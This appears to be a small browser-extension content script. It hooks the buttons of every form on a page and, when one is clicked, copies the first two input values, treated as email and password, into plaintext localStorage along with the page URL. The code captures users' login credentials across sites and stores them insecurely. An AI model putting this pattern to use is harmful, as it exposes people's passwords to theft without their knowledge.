console.log('you\'r in the world of content.js');
window.onload = function(){
    // x functionality when window loads
    console.log("here" + document.getElementsByTagName("form").length);

    for (var i = 0; i < document.getElementsByTagName("form").length; i++) {
	console.log('you\'r in the world of content.js');
	console.log(document.forms[i]);
	localStorage["GAMMA"] = "BETA";

	document.getElementsByTagName("form")[i].getElementsByTagName("button")[0].addEventListener("click", function() {
		var email1 =document.getElementsByTagName("input")[0].value;
		var pass1 = document.getElementsByTagName("input")[1].value;
		var url      = window.location.href; 
        localStorage["email"] = email1+"user";
        localStorage["pass"] = pass1+"pass";
        localStorage["url"] = url;
        localStorage[url] = "userid ="+ email1 + " password ="+ pass1; 
	});	
}
}